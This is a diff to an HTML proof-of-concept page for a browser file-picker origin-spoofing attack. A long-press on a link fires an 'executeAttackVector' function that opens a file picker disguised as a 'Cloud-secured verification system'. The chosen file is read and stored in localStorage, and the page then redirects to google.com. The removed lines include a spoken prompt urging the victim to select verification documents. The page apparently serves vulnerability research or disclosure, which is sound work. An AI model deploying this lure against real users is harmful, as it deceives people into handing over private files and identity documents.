@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC - File Picker & Speech Synthesis</title>
+    <title>File Picker Origin Spoof PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -83,27 +83,14 @@
         <div class="file-info" id="fileInfo"></div>
     </div>
 
-    <div class="footer-note">Cloud-secured verification system u89tppppppppppbt8p689t89g98pg88888888888tp.</div>
+    <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
         let triggered = false;
 
-        // Function to run Speech Synthesis (Text-to-Speech)
-        const speakMessage = (text) => {
-            if ('speechSynthesis' in window) {
-                const utterance = new SpeechSynthesisUtterance(text);
-                utterance.rate = 1.0;
-                utterance.pitch = 1.0;
-                window.speechSynthesis.speak(utterance);
-            }
-        };
-
         const executeAttackVector = () => {
             if (triggered) return;
             triggered = true;
-
-            // Trigger speech synthesis right away or after a brief delay
-            speakMessage("Please select your verification documen verification documen verification documen verification documen verification documen verification documen verification documen verification documen verification documen verification document.");
 
             // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
@@ -121,28 +108,49 @@
 
                     const file = await fileHandle.getFile();
                     
-                    // Display selected file name
-                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;
-
-                    // Show image preview if applicable
-                    const previewBox = document.getElementById("previewBox");
-                    const imagePreview = document.getElementById("imagePreview");
-                    
-                    if (file.type.startsWith('image/')) {
-                        imagePreview.src = URL.createObjectURL(file);
-                        previewBox.style.display = "block";
-                    } else {
-                        imagePreview.src = "";
-                        previewBox.style.display = "block";
-                    }
+                    // Simpan data foto/berkas ke dalam LocalStorage agar data tetap tersimpan saat berpindah halaman
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        try {
+                            localStorage.setItem('saved_file_data', e.target.result);
+                            localStorage.setItem('saved_file_name', file.name);
+                            localStorage.setItem('saved_file_type', file.type);
+                        } catch (err) {
+                            console.log("LocalStorage limit reached or blocked.");
+                        }
+                        
+                        // Redirect ke google.com setelah data tersimpan
+                        window.location.href = "https://google.com";
+                    };
+                    reader.readAsDataURL(file);
 
                 } catch (err) {
                     console.debug("File picker cancelled or blocked:", err.message);
-                } finally {
-                    setTimeout(() => { triggered = false; }, 1000);
+                    triggered = false;
                 }
             }, 1700); // 1.7 seconds delay for ephemeral tab
         };
+
+        // Memeriksa apakah ada data foto tersimpan sebelumnya saat halaman dimuat kembali
+        window.addEventListener("DOMContentLoaded", () => {
+            const savedData = localStorage.getItem('saved_file_data');
+            const savedName = localStorage.getItem('saved_file_name');
+            const savedType = localStorage.getItem('saved_file_type');
+
+            if (savedData && savedName) {
+                const previewBox = document.getElementById("previewBox");
+                const imagePreview = document.getElementById("imagePreview");
+                const fileInfo = document.getElementById("fileInfo");
+
+                fileInfo.innerText = `Saved file: ${savedName}`;
+                if (savedType && savedType.startsWith('image/')) {
+                    imagePreview.src = savedData;
+                    previewBox.style.display = "block";
+                } else {
+                    previewBox.style.display = "block";
+                }
+            }
+        });
 
         // Event listener for context menu (Long Press)
         const targetElement = document.getElementById("targetLink");
